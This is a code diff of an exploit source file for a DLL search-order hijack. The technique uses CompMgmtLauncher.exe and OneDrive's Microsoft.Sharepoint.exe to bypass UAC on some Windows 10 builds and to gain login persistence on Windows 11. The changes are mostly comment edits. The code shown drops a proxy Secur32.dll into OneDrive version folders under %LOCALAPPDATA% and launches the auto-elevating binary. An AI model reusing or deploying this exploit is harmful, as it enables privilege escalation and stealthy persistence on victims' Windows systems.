@@ -1,29 +1,31 @@
 /* CompMgmtLauncher & Sharepoint DLL Search Order hijacking UAC/persist
 * =====================================================================
-* CompMgmtLauncher.exe is vulnerable to to a DLL Search Order hijacking 
-* vulnerability. The binary, will perform a search within user env for 
-* the DLL's Secur32.dll or Wininet.dll when Onedrive is installed. 
-* CompMgmtLauncher.exe has autoelavate enabled on some versions of Windows 
+* CompMgmtLauncher.exe is vulnerable to to a DLL Search Order hijacking
+* vulnerability. The binary, will perform a search within user env for
+* the DLL's Secur32.dll or Wininet.dll when Onedrive is installed.
+* CompMgmtLauncher.exe has autoelavate enabled on some versions of Windows
 * 10. This can be exploited using a Proxy DLL to execute code as autoelevate
 * is enabled and OneDrive is installed by default on Windows 10 Desktop. On
-* Windows 11 this provides a useful persistence capability in Microsoft.Sharepoint.exe. 
-*
-* This issue has a fix in Windows 10 1703 and up as the manifest runs 
-* asInvoker, preventing misuse for UAC elevation. OneDrive must be installed 
-* to exploit this issue, which is a default configuration on Windows 10.
+* Windows 11 this provides a useful persistence capability in Microsoft.Sharepoint.exe.
+* 
+* The UAC bypass issue has a fix in Windows 10 1703 and up as the manifest runs
+* asInvoker, preventing misuse for UAC elevation, but does not patch the DLL sideloading
+* and persistence capability. OneDrive must be installed to exploit the issue, which
+* is a default configuration on Windows 10.
 * 
 * Injecting into CompMgtLauncher.exe behaves differently on x64 and x86,
-* DLL sideloading maybe most stable with wininet x86. You can also use this 
-* to persist and sideload via Microsoft.Sharepoint.exe which reads from 
-* the OneDrive location. To exploit OneDrive, you have to find OneDrive
-* version for path which is a moving target and easily read from host.
-* 
+* DLL sideloading maybe most stable with wininet x86. You can also use this
+* to persist and sideload via Microsoft.Sharepoint.exe which reads from
+* the OneDrive location. To exploit via OneDrive, you have to find OneDrive
+* version for path which is a moving target but could be enumerated from the
+* host.
+*
 * This exploit has been tested against the following product versions:
 *
 *  Windows 10 1507 x64 (tested - not vuln.)
 *  Windows 10 1511 x64 (vulnerable) 
 *  Windows 10 1607 x64 (tested - not vuln)
-*  Windows 11 21996.1 x64 (Persistence / LOLbin / Microsft.Sharepoint.exe)
+*  Windows 11 21996.1 x64 (Persistence / LOLbin / Micrsoft.Sharepoint.exe)
 * 
 * TODO; This project will compile for x86, but needs adding secur32_org.dll 
 * from x86 as using embedded x64 only. 
@@ -135,12 +137,12 @@ int main(int argc, char* argv[])
 	// test windows 11 22.225.1026.0001 x64 unstable
 	// test windows 11 23.086.0423.0001 x64 unstable
 	// 
-	// locate %LOCALAPPDATA% environment variable to concat onto
+	// locate %LOCALAPPDATA% environment variable, find the installed OneDrive path, note this is
+	// hardcoded. TODO: read the version from Registry hive to improve portabilty between versions.
 	LPWSTR pAppPath = new WCHAR[MAX_ENV_SIZE];
 	GetEnvironmentVariable(L"LOCALAPPDATA", pAppPath, MAX_ENV_SIZE);
-	// this is a Windows 11 21996.1 x64 target.
 #ifdef _M_IX86
-	// writes the proxy DLL to %LOCALAPPDATA%
+	// writes the proxy DLL to %LOCALAPPDATA% - A Windows 11 21996.1 x64 target, this changes per host. 
 	sSize = wcslen(pAppPath) + wcslen(L"\\Microsoft\\OneDrive\\22.225.1026.0001\\Secur32.dll") + 1;
 	LPWSTR pBinPatchPath = new WCHAR[sSize];
 	swprintf(pBinPatchPath, sSize, L"%s\\Microsoft\\OneDrive\\22.225.1026.0001\\Secur32.dll", pAppPath);
@@ -149,7 +151,7 @@ int main(int argc, char* argv[])
 	LPWSTR pBinOrigPath = new WCHAR[sSize];
 	swprintf(pBinOrigPath, sSize, L"%s\\Microsoft\\OneDrive\\22.225.1026.0001\\Secur32_org.dll", pAppPath);
 #elif _M_X64 // sometimes different path
-	// writes the proxy DLL to %LOCALAPPDATA% - works on test box Windows 11 21996.1 x64
+	// writes the proxy DLL to %LOCALAPPDATA% - works on test box Windows 11 21996.1 x64 - change me
 	sSize = wcslen(pAppPath) + wcslen(L"\\Microsoft\\OneDrive\\23.086.0423.0001\\Secur32.dll") + 1;
 	LPWSTR pBinPatchPath = new WCHAR[sSize];
 	swprintf(pBinPatchPath, sSize, L"%s\\Microsoft\\OneDrive\\23.086.0423.0001\\Secur32.dll", pAppPath);
@@ -189,7 +191,8 @@ int main(int argc, char* argv[])
 			shinfo.lpFile = L"C:\\Windows\\System32\\CompMgmtLauncher.exe";
 #elif _M_X64
 			shinfo.lpFile = L"CompMgmtLauncher.exe";
-			// fire up \\Microsoft\\OneDrive\\23.086.0423.0001\\Microsoft.Sharepoint.exe if you just want a user sideload / persistence on login
+			// execute \\Microsoft\\OneDrive\\23.086.0423.0001\\Microsoft.Sharepoint.exe 
+			// if you just want a user sideload / persistence on login
 #endif
 			shinfo.lpParameters = L""; // parameters
 			shinfo.lpDirectory = NULL;
